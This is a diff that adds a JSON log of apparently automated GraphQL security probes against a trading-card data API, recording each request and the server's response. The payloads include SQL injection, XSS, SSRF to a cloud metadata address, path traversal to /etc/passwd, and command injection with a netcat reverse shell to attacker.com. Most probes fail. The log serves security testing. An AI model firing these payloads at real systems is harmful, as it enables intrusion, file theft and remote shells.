@@ -1,0 +1,1010 @@
+[
+  {
+    "query": {
+      "query": "\nquery {\n  set(id: \"swsh9-1\") {\n    id\n    name\n    cardCount {\n      total\n      official\n    }\n    releaseDate\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.703,
+    "timestamp": "2025-10-05T01:14:44.724140Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "set": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  set(id: \"swsh9-1\", filters: \"1' UNION SELECT NULL,version()-- \") {\n    id\n    name\n    symbol\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.7,
+    "timestamp": "2025-10-05T01:14:48.379468Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Expected value of type \"SetFilters\", found \"1' UNION SELECT NULL,version()-- \".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 31
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  set(id: \"swsh9-1\", filters: \"<script>alert(document.domain)</script>\") {\n    id\n    logo\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.53,
+    "timestamp": "2025-10-05T01:14:51.030362Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Expected value of type \"SetFilters\", found \"<script>alert(document.domain)</script>\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 31
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  set(id: \"swsh9-1\", filters: \"imageLoader={\\\"url\\\":\\\"http://169.254.169.254\\\"}\") {\n    id\n    tcgOnline\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.492,
+    "timestamp": "2025-10-05T01:14:53.506675Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Expected value of type \"SetFilters\", found \"imageLoader={\\\"url\\\":\\\"http://169.254.169.254\\\"}\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 31
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  set(id: \"swsh9-1; $(nc -e /bin/sh attacker.com 1337)\", filters: null) {\n    id\n    boosters { name }\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.661,
+    "timestamp": "2025-10-05T01:14:56.505233Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "null is not an object (evaluating 'value.indexOf')",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "path": [
+            "set"
+          ]
+        }
+      ],
+      "data": {
+        "set": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  set(id: \"../../../../../etc/passwd\", filters: null) {\n    id\n    logo\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.424,
+    "timestamp": "2025-10-05T01:14:58.676971Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "null is not an object (evaluating 'value.indexOf')",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "path": [
+            "set"
+          ]
+        }
+      ],
+      "data": {
+        "set": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  set(id: \"swsh9-1\", filters: \"<iframe src='javascript:alert(1)'>\") {\n    id\n    description\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.455,
+    "timestamp": "2025-10-05T01:15:01.204196Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Expected value of type \"SetFilters\", found \"<iframe src='javascript:alert(1)'>\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 31
+            }
+          ]
+        },
+        {
+          "message": "Cannot query field \"description\" on type \"Set\".",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  set(id: \"swsh9-1\") {\n    id\n    name\n    symbol\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.453,
+        "timestamp": "2025-10-05T01:15:03.809091Z",
+        "response_body": {
+          "data": {
+            "set": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.43,
+        "timestamp": "2025-10-05T01:15:04.239004Z",
+        "response_body": {
+          "data": {
+            "altSet": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-05T01:15:04.239089Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 200,
+    "retry_time_seconds": 0.464,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  altSet: set(id: \"swsh9-1\") {\n    i: id\n    n: name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.392,
+        "timestamp": "2025-10-05T01:15:07.188497Z",
+        "response_body": {
+          "data": {
+            "set": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.469,
+        "timestamp": "2025-10-05T01:15:07.657263Z",
+        "response_body": {
+          "data": {
+            "altSet": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 9,
+    "timestamp": "2025-10-05T01:15:07.657282Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 200,
+    "retry_time_seconds": 0.467,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery Introspection {\n  set {\n    queryType { name }\n    types {\n      name\n      fields {\n        name\n        type {\n          name\n          kind\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.467,
+    "timestamp": "2025-10-05T01:15:11.265137Z",
+    "count": 10,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"queryType\" on type \"Set\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ]
+        },
+        {
+          "message": "Cannot query field \"types\" on type \"Set\".",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  set(name: \"Set\") {\n    name\n    filds {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.473,
+    "timestamp": "2025-10-05T01:15:14.170481Z",
+    "count": 11,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"name\" on field \"Query.set\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ]
+        },
+        {
+          "message": "Cannot query field \"filds\" on type \"Set\". Did you mean \"cards\" or \"id\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery set {\n  set(id: \"sv6-1\", filters: {name: \"Scarlet ex\"}) {\n    id\n    name\n    releaseDate\n    cards {\n      name\n      category\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.405,
+    "timestamp": "2025-10-05T01:15:34.975868Z",
+    "count": 12,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "set": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery set {\n  set(filters: {name: \"1' UNION SELECT * FROM sets--\"}) {\n    id\n    name\n    symbol\n    cards {\n      description\n    }\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.436,
+    "timestamp": "2025-10-05T01:15:37.274579Z",
+    "count": 13,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "set": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery set {\n  set(filters: {name: \"<script>alert(1)</script>\"}) {\n    id\n    logo\n    cards {\n      image\n      description\n    }\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.506,
+    "timestamp": "2025-10-05T01:15:40.453399Z",
+    "count": 14,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "set": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery set {\n  set(id: \"http://internal-api/admin\", filters: {name: \"Phantom\"}) {\n    logo\n    cards {\n      image\n    }\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.469,
+    "timestamp": "2025-10-05T01:15:42.725319Z",
+    "count": 15,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "set": {
+          "logo": "https://assets.tcgdex.net/en/ex/ex13/logo",
+          "cards": [
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/1"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/2"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/3"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/4"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/5"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/6"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/7"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/8"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/9"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/10"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/11"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/12"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/13"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/14"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/15"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/16"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/17"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/18"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/19"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/20"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/21"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/22"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/23"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/24"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/25"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/26"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/27"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/28"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/29"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/30"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/31"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/32"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/33"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/34"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/35"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/36"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/37"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/38"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/39"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/40"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/41"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/42"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/43"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/44"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/45"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/46"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/47"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/48"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/49"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/50"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/51"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/52"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/53"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/54"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/55"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/56"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/57"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/58"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/59"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/60"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/61"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/62"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/63"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/64"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/65"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/66"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/67"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/68"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/69"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/70"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/71"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/72"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/73"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/74"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/75"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/76"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/77"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/78"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/79"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/80"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/81"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/82"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/83"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/84"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/85"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/86"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/87"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/88"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/89"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/90"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/91"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/92"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/93"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/94"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/95"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/96"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/97"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/98"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/99"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/100"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/101"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/102"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/103"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/104"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/105"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/106"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/107"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/108"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/109"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/110"
+            },
+            {
+              "image": "https://assets.tcgdex.net/en/ex/ex13/111"
+            }
+          ]
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery set {\n  set(id: \"sv6-1; cat /etc/passwd\", filters: {}) {\n    releaseDate\n    tcgOnline\n    boosters {\n      artwork_front\n    }\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.396,
+    "timestamp": "2025-10-05T01:15:45.775344Z",
+    "count": 16,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "set": {
+          "releaseDate": "1999-01-09",
+          "tcgOnline": "BS",
+          "boosters": null
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery set {\n  set(id: \"../../etc/passwd\", filters: {logo: \"file:///etc/passwd\"}) {\n    logo\n    cards {\n      image\n    }\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.563,
+    "timestamp": "2025-10-05T01:15:48.215377Z",
+    "count": 17,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"logo\" is not defined by type \"SetFilters\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 41
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery set {\n  set(filters: {name: \"<h1>Free Boosters!</h1>\"}) {\n    name\n    cards {\n      description\n      image\n    }\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.518,
+    "timestamp": "2025-10-05T01:15:51.019087Z",
+    "count": 18,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "set": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery set {\n  set(id: \"sv6-1\") {\n    id\n    name\n    cards {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.456,
+        "timestamp": "2025-10-05T01:15:53.808590Z",
+        "response_body": {
+          "data": {
+            "set": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.437,
+        "timestamp": "2025-10-05T01:15:54.245452Z",
+        "response_body": {
+          "data": {
+            "s1": null,
+            "s2": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 19,
+    "timestamp": "2025-10-05T01:15:54.245551Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 200,
+    "retry_time_seconds": 0.416,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery set {\n  s1: set(id: \"sv6-1\") {\n    id\n    name\n  }\n  s2: set(id: \"sv3-5\") {\n    id\n    symbol\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.452,
+        "timestamp": "2025-10-05T01:15:56.913088Z",
+        "response_body": {
+          "data": {
+            "set": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.489,
+        "timestamp": "2025-10-05T01:15:57.402276Z",
+        "response_body": {
+          "data": {
+            "s1": null,
+            "s2": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 20,
+    "timestamp": "2025-10-05T01:15:57.402360Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 200,
+    "retry_time_seconds": 0.394,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery set {\n  set {\n    types {\n      name\n      fields {\n        name\n        type {\n          name\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.498,
+    "timestamp": "2025-10-05T01:16:00.321109Z",
+    "count": 21,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Set\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery set {\n  set(id: \"sv6-1\") {\n    id\n    nam\n    releseDate\n    crads {\n      nme\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.808,
+    "timestamp": "2025-10-05T01:16:03.721928Z",
+    "count": 22,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"nam\" on type \"Set\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ]
+        },
+        {
+          "message": "Cannot query field \"releseDate\" on type \"Set\". Did you mean \"releaseDate\"?",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ]
+        },
+        {
+          "message": "Cannot query field \"crads\" on type \"Set\". Did you mean \"cards\"?",
+          "locations": [
+            {
+              "line": 7,
+              "column": 5
+            }
+          ]
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
